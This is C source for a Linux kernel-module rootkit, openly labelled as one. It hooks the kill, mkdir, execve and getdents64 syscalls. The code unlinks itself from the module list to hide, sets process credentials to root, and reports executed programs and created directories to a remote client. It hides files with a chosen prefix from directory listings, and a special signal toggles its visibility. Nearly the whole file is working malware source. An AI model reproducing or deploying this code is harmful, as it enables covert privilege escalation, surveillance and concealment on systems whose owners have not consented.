/*
file for the all of the hooked functions and other relevant code
*/
#include "hooked_syscalls.h"

extern int BUFFER_SIZE; //size of buffers used

	/*=========================================*\
		generic functions to be used by hooks
	\*=========================================*/

static int hide_rootkit(void){ //function to unhide\hide the rootkit
	if (!module_hidden){ //module is not hidden
		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module
		list_del(&THIS_MODULE->list); //deletes this module from the list
		client_print("[rootkit] hidden\n");
	}
	else{// module is hidden
		list_add(&THIS_MODULE->list, prev_module); //adds module back into list
		client_print("[rootkit] revealed\n");
	}
	module_hidden^=1; //flips module_hidden variable
	return 0; //returns 0 for no error
}

static int set_root(void){ //changes credentials
	struct cred *root_creds; //credentials structure to be changed to root
	root_creds = prepare_creds(); //initialises the root creds

	if (root_creds == NULL){ //if root creds not initialised properly
		return -1;
	}
	//sets all of the values to 0 for root
	root_creds->uid.val = root_creds->gid.val = 0;
	root_creds->euid.val = root_creds->egid.val = 0;
	root_creds->suid.val = root_creds->sgid.val = 0;
	root_creds->fsuid.val = root_creds->fsgid.val = 0;

	commit_creds(root_creds); //commits new credentials
	return 0; //returns 0 for no error
}

	/*===================*\
		hooked syscalls
	\*===================*/

static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	int pid = regs->di; //gets ID of process to be killed from pt_regs structure
	int sig = regs->si; //gets signal from pt_regs structure
	if (sig<10||sig==19||sig==18||sig==30){ //if kill signal is interesting signal
		sprintf(buffer, "[kill] pid = %i   signal = %i\n", pid, sig); //copy message to buffer
	}
	if (sig==64){ //DEBUG IN CASE LKM IS HIDDEN AND SERVER CANNOT AUTHORISE
		hide_rootkit();
	}
	client_print(buffer); //sends message
	return sys_kill.orig_syscall(regs); //kills process and returns result
}


static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	char dir_name[NAME_MAX] = {0}; //buffer for directory name
	char __user *pathname = (char *)regs->di; //gets userspace pathname
	int mode = (int)regs->si; //gets mkdir mode

	long error =  strncpy_from_user(dir_name, pathname, NAME_MAX); //copies pathname from userspace to kernelspace
	if (error>0){ //if sucsessfuly copied
		sprintf(buffer, "[mkdir] directory = %s   mode = 0x%x\n", dir_name, mode); //copy message to buffer
	}
	else{ //if not sucsessfuly copied
		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", dir_name, mode); //copy message to buffer
	}
	client_print(buffer); //sends message
	return sys_mkdir.orig_syscall(regs); //executes original syscall
}


static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	char filename[NAME_MAX] = {0}; //buffer for filename
	char __user *filename_user = (char *)regs->di; //gets userspace filename

	long error =  strncpy_from_user(filename, filename_user, NAME_MAX); //copies filename from userspace to kernelspace
	if (error>0){ //if sucsessfuly copied
		sprintf(buffer, "[execve] %s\n", filename);  //copy message to buffer
	}
	else{ //if not sucsessfuly copied
		sprintf(buffer, "[execve] ??? (unable to be copied)  errcode = %i\n", error); //copy message to buffer
	}
	client_print(buffer); //sends message
	return sys_execve.orig_syscall(regs); //executes original syscall
}


static asmlinkage long hooked_getdents64(const struct pt_regs *regs){ //hook function
	char buffer[BUFFER_SIZE]; //buffer for sprintf
	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si; //gets the userspace dirent structure from regs
	int ret = sys_getdents64.orig_syscall(regs); //gets the directory listing from  originalgetdents64
	unsigned long offset = 0; //offset for loop
	dirent_ker = kzalloc(ret, GFP_KERNEL); //allocates memory and zeroes out for kernelspace dirent

	if (ret <= 0 || dirent_ker==NULL){ //if neither above failed
        return ret; //return original syscall result
	}
	int err;
    err = copy_from_user(dirent_ker, dirent, ret); //copy dirent from userspace in dirent_ker
    if(err){ //if error copying from userspace
		kfree(dirent_ker); //free buffer
	    return ret; //return original result
	}

	while(offset<ret){ //loops through all of the directies
		//hides all files/directories beginning with rootkit_id
        current_dir = (void *)dirent_ker + offset; //goes to next directory

        if ( memcmp(ROOTKIT_ID, current_dir->d_name, strlen(ROOTKIT_ID)) == 0){ //Compare the first bytes of current_dir->d_name to rootkit id
			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
			client_print(buffer);
			
			if (current_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
				ret -= current_dir->d_reclen; //decrements ret
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //shifts all structs up in memory
                continue;

			}
			previous_dir->d_reclen += current_dir->d_reclen; //hide entry by incrimenting length of previous entry, "swallowing" the entry
        }
		else{ //if don't need to hide it
			previous_dir = current_dir; //sets previous directory entry
		}
        offset += current_dir->d_reclen; //incriment offset by length of current_dir
	}

    err = copy_to_user(dirent, dirent_ker, ret); //Copy dirent_ker back to userspace from dirent_ker
    if(err){ //if error copying back to userspace
		kfree(dirent_ker);
		return ret;
	}
	kfree(dirent_ker);
	return ret;
}
